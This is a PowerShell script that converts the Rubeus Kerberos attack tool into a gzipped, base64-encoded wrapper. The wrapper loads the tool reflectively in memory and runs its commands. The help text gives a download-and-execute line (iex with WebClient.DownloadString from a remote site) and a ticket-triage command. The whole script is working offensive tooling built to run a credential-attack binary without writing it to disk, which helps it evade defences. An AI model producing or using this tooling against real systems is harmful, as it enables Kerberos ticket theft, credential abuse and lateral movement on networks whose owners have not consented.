<#
.SYNOPSIS
    .
.DESCRIPTION
    Wraps a rubeus.exe into a Powershell Script, gzip and base64 converted.
    Can afterwards be imported with 
    c:\ps>iex(new-object net.webclient).downloadstring("https://yoursite/invoke-rubeus.ps1")
    c:\ps>invoke-rubeus -command triage
.PARAMETER Infile
    path to the Rubeus exe file.
.EXAMPLE
    C:\PS> . .\convert_rubeus_to_ps1
    C:\PS>invoke-convert -infile c:\temp\rubeus.exe
.NOTES
    Author: Mario H Felix Jr
    Date:   July 4, 2021    
#>

$CWD = [Environment]::CurrentDirectory
[Environment]::CurrentDirectory = $PWD

function Invoke-convert
{
[CmdletBinding()] param (
 
      [string] $infile
 
   )

#$outfile = $infile + ".base64.txt"
$a = ".\temp.gz"
$srcFileStream = New-Object System.IO.FileStream($infile,([IO.FileMode]::Open),([IO.FileAccess]::Read),([IO.FileShare]::Read))
$dstFileStream = New-Object System.IO.FileStream($a,([IO.FileMode]::Create),([IO.FileAccess]::Write),([IO.FileShare]::None))
$gzip = New-Object System.IO.Compression.GZipStream($dstFileStream,[System.IO.Compression.CompressionMode]::Compress)
$srcFileStream.CopyTo($gzip)
$gzip.Dispose()
$z = [System.IO.File]::ReadAllBytes($a)
$Base64String = [System.Convert]::ToBase64String($z)
#$Base64String | Out-File $outfile
$Global:b64 = $Base64String 
rm $a
export   
}

function export
{
$text = @'
function Invoke-Rubeus
{

    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [String]
        $Command

    )
    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("
'@
$text += $b64
$text += @'
"))
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [Rubeus.Program]::Main($Command.Split(" "))

    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}
'@
$text | out-file .\invoke-rubeus.ps1
}
